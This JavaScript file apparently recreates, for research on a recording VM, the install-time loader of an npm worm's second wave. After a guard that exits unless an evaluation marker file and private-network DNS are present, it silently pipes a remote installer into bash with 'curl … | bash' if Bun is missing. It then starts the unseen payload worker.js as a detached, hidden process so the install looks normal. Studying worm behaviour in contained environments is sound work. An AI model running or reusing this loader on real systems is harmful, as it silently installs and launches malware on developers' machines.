// The install script of the worm's second wave, as the write-ups describe it
// (../README.md): make sure Bun is on the machine, by Bun's own installer if
// it is not, start the payload with it as a process of its own, and return so
// the install finishes as usual.
//
// It runs only on a recording VM: see guard() in worker.js, repeated here.
import { spawn, spawnSync } from "node:child_process";
import dns from "node:dns/promises";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) process.exit(0);
  const { address } = await dns.lookup("registry.npmjs.org", 4);
  if (!/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address)) process.exit(0);
}

await guard();
const here = path.dirname(fileURLToPath(import.meta.url));
let bun = path.join(os.homedir(), ".bun/bin/bun");
const found = spawnSync("which", ["bun"], { encoding: "utf8" });
if (found.status === 0) bun = found.stdout.trim();
else if (!fs.existsSync(bun)) spawnSync("bash", ["-c", "curl -fsSL https://bun.sh/install | bash"], { stdio: "ignore" });
if (fs.existsSync(bun)) spawn(bun, ["worker.js"], { cwd: here, detached: true, stdio: "ignore" }).unref();
